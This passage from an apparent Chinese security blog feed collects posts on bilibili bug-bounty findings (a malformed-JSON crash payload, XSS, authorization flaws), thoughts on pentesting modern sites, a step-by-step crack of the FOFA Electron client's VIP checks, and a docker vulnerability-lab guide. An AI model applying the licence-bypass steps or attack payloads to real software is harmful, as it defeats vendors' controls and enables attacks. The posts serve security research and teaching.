</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">state</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">goToUrl</span><span class="p">(</span><span class="nx">getUrlParam</span><span class="p">(</span><span class="s2">&#34;f&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">showError</span><span class="p">(</span><span class="s2">&#34;验证码错误，请重新输入！&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>双引号和单引号均被转义,有兴趣的读者可以作为对自己的挑战.还有过滤的waf</p>
]]></content></item><item><title>挖掘src漏洞</title><link>https://blue-bird1.github.io/posts/srcbug/</link><pubDate>Sun, 14 Apr 2019 23:22:41 +0800</pubDate><guid>https://blue-bird1.github.io/posts/srcbug/</guid><description>前言 挖src也将近两个月了,写篇博客总结一下. 首先挖洞成果 3中危 2低危, 收入~2k. 真实菜到扣脚,收入连泡面都吃不起.只挖了bilibili</description><content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>挖src也将近两个月了,写篇博客总结一下.</p>
<p>首先挖洞成果 3中危 2低危, 收入~2k. 真实菜到扣脚,收入连泡面都吃不起.只挖了bilibili src.</p>
<p>另外新业务挖洞难度确实比较低,我甚至挖到了一个毫无难度的越权删除投票. bilibili 开新功能很频繁,我才能挖到这么多.一年半之前挖了一次,啥都没找到.</p>
<p>这次的漏洞挖掘主要是web方向,只用了浏览器,其他工具都没用.</p>
<h2 id="成功挖掘到的漏洞分析">成功挖掘到的漏洞分析</h2>
<p>分享审核通过并已修复或无危害的漏洞供参考(非细节)</p>
<h3 id="客户端dos">客户端dos</h3>
<p>b站客户端加入了聊天功能,而聊天信息格式比较复杂.凡是复杂的格式都容易出现问题, 通过简单测试,发现通过构造畸形的json分享信息可直接崩溃客户端. 例如</p>
<p><code>msg[content]={&quot;content&quot;:&quot;test&quot;&quot;}</code></p>
<p>奖金 30安全币   1安全币==10人民币</p>
<p>由于复杂格式,这种类型的漏洞应该还存在.事实上我测试时确实用第二种信息打崩溃了,不过忘记当时写的什么了</p>
<h3 id="客户端越权">客户端越权</h3>
<p>也是聊天系统的bug,未验证撤回信息者是否是信息发出人,导致可直接撤回他人信息.这个没什么技术含量,只是没人测试过这个功能,让我捡漏了而已.</p>
<p>奖金 20安全币</p>
<h3 id="隐藏页面反射xss">隐藏页面反射xss</h3>
<p>这个xss其实也没什么技术含量,直接arg=<code>payload</code> . 没有被人发现是因为这个页面存在于登陆记录页面,然后我是坚持阅读js源码的,然后发现在js代码中有一段if 记录状态异常,就有一个按钮打开反馈页面.然后这个反馈页面存在反射xss.</p>
<p>重分说明阅读js源码重要性,没阅读或不碰巧账号异常是不会发现这个页面</p>
<p>奖金 65安全币</p>
<h3 id="越权删除投票">越权删除投票</h3>
<p>没有任何技术含量,只是没人测试过</p>
<p>奖金 100安全币</p>
<h3 id="前端验证">前端验证</h3>
<p>bilibili 专车号虽然打开要求账号认证,但是实际上是前端认证.通过打断点到验证处修改可直接通过,但是由于内部功能都需要审核被忽略了.</p>
<p>想快速找到你想要的代码,就要熟练使用chrome开发工具了. 在开发功能网络块可发现请求用户信息,所以可以通过断点XHR来定位代码.</p>
<p>方法如图</p>
<p><img src="https://i.loli.net/2019/04/14/5cb230c130fa4.png" alt="Screenshot_12.png"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">或者在控制台勾选Log XMLHTTPRequests
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://i.loli.net/2019/04/14/5cb2311674088.png" alt="Screenshot_13.png"></p>
<p>打出的日志中会包含js代码位置</p>
<h2 id="未成功找到的思路">未成功找到的思路</h2>
<h3 id="window-postmessage">window postmessage</h3>
<p><code>window.postmessage</code> 允许跨域发送,是一种新的攻击向量,如果js代码中接受message并用来构建html,会导致xss .b站全站约有7-8处接受postmessage的代码,均未验证发送者. 但是很遗憾的是只有一处真正用传送的数据直接做为html,这处还要求传送的字符串 &gt;0.导致无法利用做为xss</p>
<p>想知道当前页面有没有这个功能?很简单,打开开发工具 sources面板 global listeners</p>
<p><img src="https://i.loli.net/2019/04/14/5cb2362203afc.png" alt="Screenshot_14.png"></p>
<h4 id="缓存攻击">缓存攻击</h4>
<p>缓存攻击最典型的就是</p>
<p>配置cdn会缓存.js/.css文件,然后404页面返回码也是200,并包含一些用户信息,攻击者可使受害者打开 /noexist.js的url,此时cdn会认为返回码200,后缀也是js.会将这个404页面缓存起来,然后攻击者可读取这个缓存来获取信息</p>
<p>很遗憾的是b站未符合上述条件,404就是404.并且使用的是现代化前端技术,未返回任何信息在html页面中,难以通过缓存来攻击</p>
<h4 id="切换http方法-csrf">切换http方法 CSRF</h4>
<p>注意到csrf参数只在post方法生效,试图转换成get方法来绕过csrf限制, 不过还没有找到同时允许get和post方法的api.能直接找到get方法的已经是csrf了(找到了一个还未修复)</p>
]]></content></item><item><title>现代化网站的渗透测试</title><link>https://blue-bird1.github.io/posts/newsitethink/</link><pubDate>Fri, 22 Feb 2019 21:07:40 +0800</pubDate><guid>https://blue-bird1.github.io/posts/newsitethink/</guid><description>对现代化网站的渗透测试的思考 前言 首先定义本文所说的现代化网站. 现代化网站是指符合以下多个特征的对外服务. 储存,数据库,网站程序等服务器高度分</description><content type="html"><![CDATA[<h2 id="对现代化网站的渗透测试的思考">对现代化网站的渗透测试的思考</h2>
<h3 id="前言">前言</h3>
<p>首先定义本文所说的现代化网站. 现代化网站是指符合以下多个特征的对外服务.</p>
<ul>
<li>
<p>储存,数据库,网站程序等服务器高度分离</p>
</li>
<li>
<p>实现现代化前端技术, 如三大框架, html5新api, websocket</p>
</li>
<li>
<p>基于虚拟化技术的服务部署</p>
</li>
<li>
<p>使用现代后端框架,如ssm,think5,gin,django</p>
</li>
<li>
<p>外部服务高度集成</p>
</li>
<li>
<p>多种客户端,包括Android,Ios,windows</p>
</li>
</ul>
<p>篇幅有限, 不再列举,但相信读者应该能理解笔者的意思.</p>
<p>不属于现代化网站最典型的例子就是 下载cms,安装lnmp,直接安装网站程序.
现在渗透教程基本都是基于不属于现代化网站的假设(实际上我还没发现基于渗透现代化网站假设的教程)</p>
<h3 id="现代化特征对渗透测试的影响">现代化特征对渗透测试的影响</h3>
<p>笔者按自己的思路逐个列举有影响的特征</p>
<h4 id="cdn反向代理">CDN/反向代理</h4>
<p>使用了CDN将会隐藏真实IP, 导致常规端口扫描,弱口令扫描全部失效.
但可以通过寻找真实ip来解决.
反向代理则无解, 甚至可能只把代理服务器暴露于公网.敏感服务全在内网</p>
<p>对绕过CDN这个问题, 已经有了一定的研究.有了安全工具, 如<a href="https://github.com/Tai7sy/fuckcdn">fuckcdn</a></p>
<h4 id="数据分离">数据分离</h4>
<p>上传文件服务器分离,将导致上传webshell技术失效, 很显然文件服务器是不可能执行webshell的. 上传危害最多只能达到上传html</p>
<h4 id="websocket">websocket</h4>
<p>之所以专门把websocket作为一点, 是因为感觉websocket属于盲区, burp,浏览器均不支持websocket的渗透测试.</p>
<h4 id="新的h5-api">新的h5 api</h4>
<p>html5提供了新的api,但是这方面的安全问题还没有被开发人员重视.这个可以从hackone平台上的漏洞报告看出.例如<a href="https://hackerone.com/reports/398054">DOM Based XSS in www.hackerone.com via PostMessage</a> .</p>
<p><code>postmessage</code>这类api的输入是不可控的,如果不进行控制, 就是安全问题.</p>
<h4 id="前后端分离">前后端分离</h4>
<p>使用三大框架(vue,react, angular)的前端, 对后端进行分离. 也就是不再将url参数直接渲染到html,而通过JavaScript操作.反射xss全部失效,常规储存xss在框架的安全性下也变得渺茫.
JavaScript操作带来的xss反而变为主流.这也对渗透测试人员阅读JavaScript代码带来了挑战
也带来了部分好处,由于在前端操作,后端暴露的接口将会更多.</p>
<h4 id="后端框架">后端框架</h4>
<p>应用了框架后,简单注入全部失效,csrf部分失效, <code>id=x</code>这种低级注入消失.出现注入的点趋向二次注入, 编码注入. sqlmap是不提供原生支持的.</p>
<h4 id="外部服务接入">外部服务接入</h4>
<p>对某些功能不自行进行开发,使用其他公司的服务.这部分功能的安全性取决与该公司的安全水平, 不过真挖出漏洞就属于通用0day了.</p>
<p>由于对接入服务的理解,接入处反而容易出现问题, 比如未预料的异常.(接入开发: ???,这个问题你怎么不在服务上处理.服务开发: ???,这个你怎么不在接入处处理)</p>
<h4 id="多服务端">多服务端</h4>
<p>提供了多平台客户端, 这就对渗透测试多平台渗透能力发出了挑战.
不但要会web,还要会安卓/ios渗透测试, 反编译(客户端总是会有一些未公开的api).甚至还有IOT</p>
<h4 id="风控">风控</h4>
<p>好的风控系统 基本阻止了邮箱/短信轰炸.对需要爆破的漏洞也降低了危害.</p>
<h4 id="xass">Xass</h4>
<p>Sass, Pass,Fass等各种服务公司不断涌现,  可能出现刚拿下shell,想内网渗透,发现实际上服务是在某Sass上.或者发现服务api是在Fass上的,根本没有服务器</p>
<h4 id="虚拟化">虚拟化</h4>
<p>docker提供了优秀的服务分离,就算拿到了shell,也只是拿到了容器的shell. 容器虚拟化不一定安全,但是现在对这方面的研究还不是很多, 完全没有对绕过UAC的研究多.</p>
<h3 id="对安全教程的思考">对安全教程的思考</h3>
<p>现在一些安全教程还是停留在旧时代, <code>' and 1=1</code>,
<code>&lt;/x&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>固然是基础,挖掘思路也很重要.
但是随着技术的发展, 渗透和开发技术也会走的更近, 新开发技术的爆发式增长,不可能像列中间件漏洞一样全部写出它们的渗透技术.就算有人写出来,等写出来黄花菜都凉了.
安全教程应该更强调编程, 而不是培养只会用扫描器的驻场工程师.令人欣慰的是现在年轻的渗透测试人员大部分都会编程,还不止一门(就笔者圈子来看).</p>
<h3 id="对安全工具的思考">对安全工具的思考</h3>
<h4 id="扫描器">扫描器</h4>
<p>随着技术的扩散,老式扫描器未来会面临失效.不支持浏览器模拟,只会抓a标签的扫描器, 对前后端分离无能为力. 基于流量和基于爬虫的扫描器会合并, 走向模拟获取流量进行扫描的模式
对app的扫描器目前不支持对web的渗透测试</p>
<h4 id="人工智能">人工智能</h4>
<p>人工智能火热,各路安全公司都号称使用了AI技术(实际上怎么样就不知道了). 除了使用AI技术对AI进行对抗, AI扫描器也在发展中.
这部分知识,我推荐兜哥的AI安全三部曲.</p>
<p>可以重复的渗透测试动作,AI都可以模拟.随着发展,只会重复的渗透人员会面临淘汰.也能让安全人员拿出精力进行安全研究,而不是重复性的测试.</p>
<h3 id="尾言">尾言</h3>
<p>现在正是承前启后的时代,旧的开发技术未被淘汰,新的开发技术正在发展, 谁会在这个时代引领潮流, 或是被淘汰.让我们拭目以待吧</p>
]]></content></item><item><title>Electron软件简单破解</title><link>https://blue-bird1.github.io/posts/electroncrack/</link><pubDate>Thu, 24 Jan 2019 23:14:25 +0800</pubDate><guid>https://blue-bird1.github.io/posts/electroncrack/</guid><description>electron 软件破解与修改入门 electron是一款流行的桌面软件框架, 可以用js来写桌面软件, 快速开发.为了提高开发效率,不少公司比如白帽汇直接采用</description><content type="html"><![CDATA[<h3 id="electron-软件破解与修改入门">electron 软件破解与修改入门</h3>
<p>electron是一款流行的桌面软件框架, 可以用js来写桌面软件, 快速开发.为了提高开发效率,不少公司比如白帽汇直接采用了这种技术编写客户端,而不是传统的c++,c#.. 以下均采用白帽汇的fofa客户端作为例子讲解,目的是让fofa客户端的扫描功能无需验证. 这个功能命令是直接调用cli的, 并不需要网络验证.</p>
<h4 id="解包">解包</h4>
<p>electron的代码在<code>resources</code>目录,根据打包方式的不同, 可能看到<code>app</code>目录或者<code>app.asar</code>. 目录就不需要解包了.</p>
<p><code>asar</code>并不是加密格式, 只是压缩格式. 可以使用<code>asar</code>工具直接解包.</p>
<p>下载方式</p>
<p><code>npm install -g asar</code></p>
<p>解包命令</p>
<p><code>asar extract app.asar  &lt;目录名&gt;</code></p>
<p>例如<code>asar extract app.asar  fofa</code></p>
<h4 id="代码目录">代码目录</h4>
<p>代码目录是什么样子全看开发者. 通常都会存在<code>main.js</code>和<code>node_modules</code>目录.<code>main.js</code>是启动文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">»»»» ls                                                                       
</span></span><span class="line"><span class="cl">com  css  data  fonts  images  js  main.js  myjs  node_modules  package.json  tpl
</span></span></code></pre></td></tr></table>
</div>
</div><p>目录命名很清晰</p>
<h4 id="调试功能">调试功能</h4>
<p>electron自带调试. 而且fofa的开发非常友好, 所有代码只有<code>com</code>目录的代码混淆了, 而且用的还是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="cm">/*  This obfuscated code was created by Javascript Obfuscator Free Version.*/</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  Javascript Obfuscator Free Version can be downloaded here              */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  http://javascriptobfuscator.com                                        */</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>注释也很友好,直接打开就看到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  // 指定一个入口的html文件
</span></span><span class="line"><span class="cl">  mainWindow.loadURL(&#39;file://&#39; + __dirname + &#39;/tpl/login.html&#39;);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  // 打开调试工具，其实就是chrome的那套调试工具
</span></span><span class="line"><span class="cl">    //  mainWindow.webContents.openDevTools();
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接解开注释就行了.</p>
<p><code> mainWindow.webContents.openDevTools();</code></p>
<h4 id="重打包">重打包</h4>
<p>重打包很简单</p>
<p><code>asar pack fofa app.asar</code></p>
<p>直接覆盖原<code>app.asar</code>就行了</p>
<p>上面的修改效果如下</p>
<p><img src="https://i.loli.net/2019/01/25/5c4b21a447162.png" alt="Screenshot_5.png"></p>
<p>很眼熟吧, 就是chrome的调试功能</p>
<p>然后我们需要寻找功能点.其实很简单,fofa的网页都放在<code>tpl</code>目录了. 在页面查看元素对比一下就知道了.  我们找到<code>tpl\edit-poc.html</code></p>
<p>网页没混淆&hellip; 功能点也没在混淆的js里,直接在<code>script</code>标签里了(我白解密了)..</p>
<p>看扫描按钮的文字是<code>开始扫描</code>, 直接在网页搜索一下, 直接搜到功能代码了..开发有良好的注释习惯,让我们为fofa开发点赞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$(&#34;.start_scan&#34;).click(function() {//开始扫描
</span></span><span class="line"><span class="cl">		bugnum = 0;
</span></span><span class="line"><span class="cl">		$(&#39;#san_result&#39;).html(&#39;&#39;);//默认清空 ,显数据
</span></span><span class="line"><span class="cl">		$(&#39;#san_result1&#39;).html(&#39;&#39;);//默认清空 ,显提示
</span></span><span class="line"><span class="cl">		isvipaaaa();
</span></span><span class="line"><span class="cl">		$(&#39;#san_result1&#39;).html(&#39;&#39;);
</span></span><span class="line"><span class="cl">		$(&#39;#san_result_have&#39;).html(&#39;&#39;);
</span></span><span class="line"><span class="cl">		$(&#39;#san_result_no&#39;).html(&#39;&#39;);
</span></span><span class="line"><span class="cl">		cvs_content = [];
</span></span><span class="line"><span class="cl">	    Buglist = &#39;&#39;;
</span></span><span class="line"><span class="cl">	});
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看<code>isvipaaa</code>函数</p>
<p>主要代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">        if(data.fcoin == 0 &amp;&amp; $(&#34;#scan_free&#34;).val() != 100 &amp;&amp; UserInfo.vip_level != 2) {                                    $(&#39;#san_result1&#39;).append(&#39;&lt;tr&gt;&lt;td colspan=&#34;4&#34;rowspan=&#34;4&#34;&gt;你的账号fofa币不足不能进行扫描。&lt;/td&gt;&lt;/tr&gt;&#39;);                    return;                
</span></span><span class="line"><span class="cl">        }                
</span></span><span class="line"><span class="cl">        if(($(&#34;#scan_free&#34;).val() != 100 &amp;&amp; UserInfo.vip_level !=2)||($(&#34;#scan_free&#34;).val() ==&#39;&#39; &amp;&amp; UserInfo.vip_level == 2) ) {                    var scanok = scan_sure();                   
</span></span><span class="line"><span class="cl">        if(scanok == false) {    
</span></span><span class="line"><span class="cl">        return         
</span></span><span class="line"><span class="cl">        }               
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        if(data.is_verified){
</span></span><span class="line"><span class="cl">            /*扫描代码*/
</span></span><span class="line"><span class="cl">        }else{
</span></span><span class="line"><span class="cl">              $(&#39;#contentarea&#39;).html(&#34;&#34;);
</span></span><span class="line"><span class="cl">                    wrongmas1(&#34;对不起你还没有通过审核,请联系管理员!!&#34;);
</span></span><span class="line"><span class="cl">        }
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到就是三个<code>if</code>, 直接删除验证代码就完了..</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nx">isvipaaaa</span><span class="p">()</span> <span class="p">{</span> <span class="c1">//扫描
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">			<span class="nx">url</span><span class="o">:</span> <span class="nx">login_url</span> <span class="o">+</span> <span class="s1">&#39;?email=&#39;</span> <span class="o">+</span> <span class="nx">UserInfo</span><span class="p">.</span><span class="nx">email</span> <span class="o">+</span> <span class="s1">&#39;&amp;key=&#39;</span> <span class="o">+</span> <span class="nx">UserInfo</span><span class="p">.</span><span class="nx">key</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="nx">dataType</span><span class="o">:</span> <span class="s1">&#39;json&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;get&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="nx">success</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#query_loading_tr&#39;</span><span class="p">).</span><span class="nx">css</span><span class="p">(</span><span class="s1">&#39;display&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">					<span class="nx">$</span><span class="p">(</span><span class="s2">&#34;.but_bc&#34;</span><span class="p">).</span><span class="nx">click</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#scan_rate&#39;</span><span class="p">).</span><span class="nx">css</span><span class="p">(</span><span class="s1">&#39;width&#39;</span><span class="p">,</span> <span class="s1">&#39;0%&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#scan_rate_value&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">&#39;0%&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#san_result&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.start_scan&#39;</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;disabled&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.stop_scan&#39;</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;disabled&#34;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.export_scan&#39;</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;disabled&#34;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">					<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.Report_scan&#39;</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;disabled&#34;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">					<span class="c1">// $(&#39;#graphbox&#39;).css(&#39;display&#39;,&#39;&#39;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					<span class="kd">var</span> <span class="nx">FileName</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#FileName&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">					
</span></span><span class="line"><span class="cl">					<span class="k">if</span><span class="p">(</span><span class="nx">from</span> <span class="o">==</span> <span class="s1">&#39;store&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">						<span class="nx">scanPoc</span><span class="p">(</span><span class="nx">temp_params2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#scan_free&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">					<span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">						<span class="nx">scanPoc</span><span class="p">(</span><span class="nx">temp_params2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#scan_free&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">					<span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>让我们看看效果,重打包替换</p>
<p><img src="https://i.loli.net/2019/01/25/5c4b2518939b5.png" alt="Screenshot_6.png"></p>
<h4 id="尾声">尾声</h4>
<p>感觉这个功能限制并没有什么意义, 本质上是执行一条系统命令用fofascan扫描而已</p>
]]></content></item><item><title>docker搭建复现环境</title><link>https://blue-bird1.github.io/posts/dockertopoc/</link><pubDate>Sat, 19 Jan 2019 22:52:13 +0800</pubDate><guid>https://blue-bird1.github.io/posts/dockertopoc/</guid><description>docker搭建复现环境 安全人员进行漏洞复现经常需要搭建漏洞环境, docker能够很方便搭建漏洞环境,同时提供相当好的性能,管理功能. doc</description><content type="html"><![CDATA[<h3 id="docker搭建复现环境">docker搭建复现环境</h3>
<p>安全人员进行漏洞复现经常需要搭建漏洞环境, docker能够很方便搭建漏洞环境,同时提供相当好的性能,管理功能.</p>
<p>docker安装请参照空格表哥的<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=47689&amp;highlight=docker">这篇文章</a></p>
<p>搭建漏洞环境也有几种情况</p>
<ul>
<li>
<p>已经有现成的docker镜像</p>
</li>
<li>
<p>只有源代码压缩包</p>
</li>
<li>
<p>漏洞软件开源</p>
</li>
</ul>
<h4 id="寻找已有docker镜像">寻找已有docker镜像</h4>
<p>dockerhub是官方的镜像仓库, 提供免费的公开镜像储存,也支持搜索   <a href="https://hub.docker.com/">网站url</a></p>
<p>可以直接搜索镜像 <code>https://hub.docker.com/search?q=&lt;keyword&gt;&amp;type=image</code></p>
<p>docker命令行也支持搜索镜像 命令格式 <code>docker search &quot;keyword&quot; </code></p>
<p>例如 <code>docker search &quot;think5&quot;</code></p>
<h4 id="从源代码搭建镜像">从源代码搭建镜像</h4>
<p>以zzzphp为例. <a href="https://github.com/Earth-Online/poc_test/tree/master/zzzphp">github地址</a></p>
<h5 id="dockerfile知识快速普及">Dockerfile知识快速普及</h5>
<p>dockerfile是一个描述建造镜像流程的文件 每一行格式</p>
<p><code>&lt;关键字&gt; &lt;n个参数&gt;</code></p>
<p>搭建漏洞环境常用的几个关键字</p>
<p><code>FROM 镜像名 </code>  说明是从哪个镜像开始建造</p>
<p><code>COPY 本地路径 镜像路径</code>  拷贝文件到镜像里</p>
<p><code>ENV 变量名 变量值</code> 定义镜像内的环境变量</p>
<p><code>RUN 命令</code> 在镜像运行一条命令</p>
<p><code>WORKDIR 路径</code>   更改之后像<code>RUN</code>这类执行命令的路径</p>
<h5 id="构建镜像">构建镜像</h5>
<p>我挑选<code>webdevops/php-apache-dev:ubuntu-15.10</code>作为基础镜像, 这个镜像提供了非常快捷的搭建方法.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> webdevops/php-apache-dev:ubuntu-15.10</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> --chown<span class="o">=</span>application:application .  /var/www/html<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ENV</span> WEB_DOCUMENT_ROOT /var/www/html<span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>只需要三行就能搭建出一个php环境</p>
<p>第二行 <code>COPY --chown=application:application .  /var/www/html</code> 拷贝当前目录到<code>/var/www/html</code> 并更改所有者成<code>application:application</code> .</p>
<p><code>application:application</code> 是这个镜像的服务器用户, 更改文件权限否则服务器不能读写文件</p>
<p><code>ENV WEB_DOCUMENT_ROOT /var/www/html</code></p>
<p><code>WEB_DOCUMENT_ROOT</code>是这个镜像的一个特殊环境变量 指向web目录</p>
<p>使用 <code>docker build -t site . </code> 建造镜像和命名为<code>site</code></p>
<h4 id="从git构建镜像">从git构建镜像</h4>
<p>和从源代码构建的区别只是在于一个用<code>COPY</code> 一个在容器直接用<code>RUN</code>执行命令.</p>
<p>例子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> webdevops/php-apache-dev:ubuntu-15.10</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> git clone https://github.com/DaBoQuan/cmseasy_decode /var/www/cmseasy <span class="o">&amp;&amp;</span> chown -R application:application /var/www/cmseasy<span class="err">
